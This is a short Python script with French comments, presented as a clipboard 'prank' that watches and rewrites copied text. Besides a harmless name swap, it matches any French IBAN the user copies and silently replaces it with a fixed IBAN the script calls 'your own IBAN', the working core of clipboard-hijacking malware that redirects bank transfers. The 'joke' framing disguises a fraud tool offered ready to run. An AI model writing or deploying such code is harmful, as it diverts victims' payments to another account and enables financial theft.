#!/usr/bin/env python3
"""
Blague presse-papier : remplace des contenus ciblés dès qu'ils sont copiés.

Lancer : python3 blague_signature.py
Arrêter : Ctrl+C
"""

import time
import sys
import re

try:
    import pyperclip
except ImportError:
    print("Installation de pyperclip...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip"])
    import pyperclip

# Format IBAN français : FR suivi de 2 chiffres puis 23 chiffres/lettres (espaces tolérés)
IBAN_RE = re.compile(r'\bFR\d{2}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{4}[\s]?[\dA-Z]{3}\b', re.IGNORECASE)

REGLES = [
    ("Léo Le Psycho", "Bip Bap BOOM"),
    (IBAN_RE,         "FR7610011000201234567890188"),
]

INTERVALLE = 0.5

print("🎯 Surveillance du presse-papier active...")
print("   Règles actives :")
print('   • "Léo Le Psycho"  →  "Bip Bap BOOM"')
print('   • RIB/IBAN         →  ton IBAN à toi')
print("   Appuie sur Ctrl+C pour arrêter.\n")

dernier_contenu = ""

def appliquer_regles(texte):
    modifie = texte
    for motif, remplacement in REGLES:
        if isinstance(motif, str):
            if motif in modifie:
                modifie = modifie.replace(motif, remplacement)
        else:
            if motif.search(modifie):
                modifie = motif.sub(remplacement, modifie)
    return modifie

try:
    while True:
        try:
            contenu = pyperclip.paste()
        except Exception:
            time.sleep(INTERVALLE)
            continue

        if contenu != dernier_contenu:
            dernier_contenu = contenu
            nouveau = appliquer_regles(contenu)
            if nouveau != contenu:
                pyperclip.copy(nouveau)
                dernier_contenu = nouveau
                print(f"💥 Presse-papier modifié !")

        time.sleep(INTERVALLE)

except KeyboardInterrupt:
    print("\n✅ Surveillance arrêtée. Blague terminée !")
